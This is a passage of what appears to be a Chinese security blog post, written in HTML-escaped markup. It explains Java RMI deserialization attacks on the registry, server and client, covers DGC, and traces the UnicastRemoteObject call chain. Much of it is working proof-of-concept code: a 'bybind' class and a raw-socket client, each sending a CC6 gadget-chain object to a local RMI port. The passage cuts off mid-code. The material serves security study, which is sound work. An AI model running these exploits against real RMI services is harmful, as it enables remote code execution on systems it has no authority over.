<span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LocateRegistry</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Registry</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Operation</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteCall</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteObject</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteRef</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> bybind <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> operations <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"void bind(java.lang.String, java.rmi.Remote)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String list()[]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.rmi.Remote lookup(java.lang.String)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"void rebind(java.lang.String, java.rmi.Remote)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Operation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"void unbind(java.lang.String)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">//获取stub对象</span>\n        <span class=\"token class-name\">Registry</span> registry <span class=\"token operator\">=</span> <span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRegistry</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7891</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//获取到RemoteObject对象</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> superclass <span class=\"token operator\">=</span> registry<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> a <span class=\"token operator\">=</span> superclass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ref\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        a<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">RemoteRef</span> ref <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">RemoteRef</span><span class=\"token punctuation\">)</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">RemoteCall</span> remoteCall <span class=\"token operator\">=</span> ref<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">RemoteObject</span><span class=\"token punctuation\">)</span> registry<span class=\"token punctuation\">,</span> operations<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4905912898345647071L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectOutput</span> outputStream <span class=\"token operator\">=</span> remoteCall<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> <span class=\"token constant\">CC6</span><span class=\"token punctuation\">.</span><span class=\"token function\">CC6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        outputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        outputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ref<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>remoteCall<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ref<span class=\"token punctuation\">.</span><span class=\"token function\">done</span><span class=\"token punctuation\">(</span>remoteCall<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"打RMI-Server\"><a href=\"#打RMI-Server\" class=\"headerlink\" title=\"打RMI Server\"></a>打RMI Server</h3><h5 id=\"方法1：\"><a href=\"#方法1：\" class=\"headerlink\" title=\"方法1：\"></a>方法1：</h5><p>原理：在远程方法调用的时候，RMI Client会发送序列化数据。这里如果接收的值是Object，就可以执行（当然不是Object也是可以的。）</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699096001746-9e34ac02-73d7-4b0e-b5fc-74391c51fd8c-20231112234407365.png\" alt=\"img\"></p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699096012251-a5a32a98-6afd-49b3-abfc-b002fa049ddb-20231112234407397.png\" alt=\"img\"></p>\n<h3 id=\"打RMI-Client\"><a href=\"#打RMI-Client\" class=\"headerlink\" title=\"打RMI Client\"></a>打RMI Client</h3><h5 id=\"漏洞点1：返回恶意的Remote对象（注册中心）\"><a href=\"#漏洞点1：返回恶意的Remote对象（注册中心）\" class=\"headerlink\" title=\"漏洞点1：返回恶意的Remote对象（注册中心）\"></a>漏洞点1：返回恶意的Remote对象（注册中心）</h5><p>因为Lookup的时候会返回Remote对象，这里是readObject，如果返回的是一个恶意的对象，这里进行了反序列化，那么就导致了问题</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699104083492-b1020866-65eb-4b15-ace9-b7018cafb1f0-20231112234407434.png\" alt=\"img\"></p>\n<h5 id=\"漏洞点2：服务端返回值是恶意的Object\"><a href=\"#漏洞点2：服务端返回值是恶意的Object\" class=\"headerlink\" title=\"漏洞点2：服务端返回值是恶意的Object\"></a>漏洞点2：服务端返回值是恶意的Object</h5><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699104324750-313368c6-21c9-40c7-b958-bb591d2eaa13-20231112234407449.png\" alt=\"img\"></p>\n<p>因为这里会对返回值进行反序列化，所以如果返回的是一个恶意的对象，那么就可以成功RCE。</p>\n<h3 id=\"通过DGC来进行攻击：\"><a href=\"#通过DGC来进行攻击：\" class=\"headerlink\" title=\"通过DGC来进行攻击：\"></a>通过DGC来进行攻击：</h3><h4 id=\"是什么？-1\"><a href=\"#是什么？-1\" class=\"headerlink\" title=\"是什么？\"></a>是什么？</h4><p>DGC：分布式垃圾回收机制</p>\n<h4 id=\"如何用？-1\"><a href=\"#如何用？-1\" class=\"headerlink\" title=\"如何用？\"></a>如何用？</h4><p>我们看下分布式中我们是如何使用RMI中如何使用，当客户端发送了lookup之后，会创建一个var2的连接，然后最后调用了一个done方法。</p>\n<p>这里的done方法会进行DGC的连接，然后进行资源释放。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699181714908-f1f0ea23-26c8-477b-8797-fb420c01a731-20231112234407469.png\" alt=\"img\"></p>\n<p>DGC肯定无法避免这两个方法，<code>clean``dirty</code>方法，这里咱可以模拟Client打Server</p>\n<ul>\n<li>Client做了什么？</li>\n</ul>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699183203228-4677080d-cb2c-434e-933e-17403e5e4ff5-20231112234407788.png\" alt=\"img\"></p>\n<h3 id=\"反序列化的Gadgets\"><a href=\"#反序列化的Gadgets\" class=\"headerlink\" title=\"反序列化的Gadgets\"></a>反序列化的Gadgets</h3><h4 id=\"UnicastRemoteObject链调试\"><a href=\"#UnicastRemoteObject链调试\" class=\"headerlink\" title=\"UnicastRemoteObject链调试\"></a>UnicastRemoteObject链调试</h4><h5 id=\"调用栈：\"><a href=\"#调用栈：\" class=\"headerlink\" title=\"调用栈：\"></a>调用栈：</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token function\">reexport</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token function\">exportObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token class-name\">UnicastServerRef</span><span class=\"token punctuation\">.</span><span class=\"token function\">exportObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token class-name\">LiveRef</span><span class=\"token punctuation\">.</span><span class=\"token function\">exportObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token class-name\">TCPEndpoint</span><span class=\"token punctuation\">.</span><span class=\"token function\">exportObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token class-name\">TCPTransport</span><span class=\"token punctuation\">.</span><span class=\"token function\">exportObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                            <span class=\"token class-name\">TCPTransport</span><span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里跟一下创建服务的时候，干了什么</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699280575360-2eb4e686-3a4a-4092-a3ab-701294e798e0-20231112234407826.png\" alt=\"img\"></p>\n<p>这里最后会做监听。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699280829420-eb4f1b57-1a1c-492a-9802-ebed2de5577b-20231112234407893.png\" alt=\"img\"></p>\n<p>起一个新线程做AcceptLoop，这里的run方法会执行executeAcceptLoop</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699280890300-1cfe356b-1eaa-400e-a275-3ce00291b5dd-20231112234407941.png\" alt=\"img\"></p>\n<p>这里会再把ConnectionHandler提交到线程池中</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699280930649-f58f29d6-9cc5-4997-b7fe-0799b58267c6-20231112234408116.png\" alt=\"img\"></p>\n<p>这里还是会去执行run方法，run方法调用了run0.</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699281020912-b1c58639-ff35-4099-b227-faecea85321f-20231112234408151.png\" alt=\"img\"></p>\n<p>run0经过一系列判断，就打了handleMessages</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699281056084-e0fa821f-a1c2-407e-8f40-fe40efe91cc4-20231112234408187.png\" alt=\"img\"></p>\n<p>然后就到了远程方法调用。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699281096279-4f859019-5ab1-40f1-a2eb-5521cc9ba6ca-20231112234408220.png\" alt=\"img\"></p>\n<p>远程方法调用了ServiceCall函数，这里打断点进去分析，最后就到了这里，这里会进行反序列化不存在的值，</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699281497987-12febc6c-9f75-4d6f-8853-1da879fb12e0-20231112234408248.png\" alt=\"img\"></p>\n<p>所以他可以起一个存在漏洞的服务端。所以我们就可以成功打反序列化的Gadgets。</p>\n<p>这里看下如何攻击反序列化的服务端：</p>\n<p>这里就得跟下代码，正常的RMI服务端如何进行handleMessage，分别接收了什么参数。等待客户端发起请求，其实客户端请求的时候就可以建立了TCP连接。这里跟下关键代码。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717407340-fa8b9f16-1165-4dd9-a8e4-1045a1c58d8a-20231112234408290.png\" alt=\"img\"></p>\n<p>这里进行数据传递之后，进行了if条件判断。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717500117-f4d0e133-ac8c-4596-90a6-58e02d7502d9-20231112234408328.png\" alt=\"img\"></p>\n<p>执行了StreamRemoteCall方法，</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717554727-e1197fd6-09e4-4f07-82dd-3b981d745e6d-20231112234408376.png\" alt=\"img\"></p>\n<p>然后进行赋值之后，执行了serviceCall方法。这里就进行了读取，跟进方法查看。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717648930-a77567e5-d27e-4632-97ca-c4273099ec79-20231112234408416.png\" alt=\"img\"></p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717677418-531f79f9-083c-4b8f-88ff-4e87fe3667e0-20231112234408435.png\" alt=\"img\"></p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717733906-d6288687-942c-4d9b-abfd-4e18f9414112-20231112234408501.png\" alt=\"img\"></p>\n<p>调用了oldDispatch函数</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717759164-8fa39aea-09a4-4ba5-8dfa-6a9da99fad63-20231112234408546.png\" alt=\"img\"></p>\n<p>调用了skle.dispatch函数<img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717783115-cc9cd814-bebd-4a76-acb0-6737e35488c0-20231112234408590.png\" alt=\"img\"></p>\n<p>这里就调用了getInputStream，下面就是readObject方法</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717900688-b97f2807-332d-4033-b7a3-250eb380a851-20231112234408636.png\" alt=\"img\"></p>\n<p>在反序列化调用Object方法之前，先调用到的是resolveClass方法，这里的Call是StreamRemoteCall，这里跟进</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699717981792-fd343d40-7e4e-4d2f-ba0a-fe77443a71fb-20231112234408655.png\" alt=\"img\"></p>\n<p>这里重点看下ConnectInputStream构造函数。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699718030471-143d333b-5088-4aa6-a001-44e64216c25d-20231112234408694.png\" alt=\"img\"></p>\n<p>他是调用了父类的父类的构造函数，也就是ObjectInputStream的构造函数进行了赋值，我们看下ConnectionInputStream，在其父类中有resolveClass方法， 在readObject之前被调用，</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699718283026-52690622-23f3-480c-92ee-62c96cf2e359-20231112234408741.png\" alt=\"img\"></p>\n<p>然后就去加载类，而readLocaltion的时候，会先读取readObject的值。</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\">protected Object <span class=\"token function\">readLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    throws IOException<span class=\"token punctuation\">,</span> ClassNotFoundException\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以我们给出的poc。</p>\n<h6 id=\"UnicastRemoteObject链poc\"><a href=\"#UnicastRemoteObject链poc\" class=\"headerlink\" title=\"UnicastRemoteObject链poc\"></a>UnicastRemoteObject链poc</h6><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Gadgets</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>study<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CC6</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>transport<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransportConstants</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SocketFactory</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DataOutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OutputStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Socket</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLClassLoader</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">static</span> <span class=\"token import static\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectStreamConstants</span><span class=\"token punctuation\">.</span><span class=\"token static\">STREAM_MAGIC</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">static</span> <span class=\"token import static\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectStreamConstants</span><span class=\"token punctuation\">.</span><span class=\"token static\">STREAM_VERSION</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">MarshalOutputStream</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ObjectOutputStream</span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MarshalOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OutputStream</span> out<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">//        @Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">annotateClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> cl<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> client <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Socket</span> socket <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">DataOutputStream</span> dataOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            socket <span class=\"token operator\">=</span> <span class=\"token class-name\">SocketFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createSocket</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7892</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            socket<span class=\"token punctuation\">.</span><span class=\"token function\">setTcpNoDelay</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">OutputStream</span> outputStream <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            dataOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataOutputStream</span><span class=\"token punctuation\">(</span>outputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            dataOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Magic</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            dataOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            dataOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>SingleOpProtocol</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            dataOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Call</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">MarshalOutputStream</span> objectOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalOutputStream</span><span class=\"token punctuation\">(</span>dataOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">669196253586618813L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> <span class=\"token constant\">CC6</span><span class=\"token punctuation\">.</span><span class=\"token function\">CC6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>socket <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                socket<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token 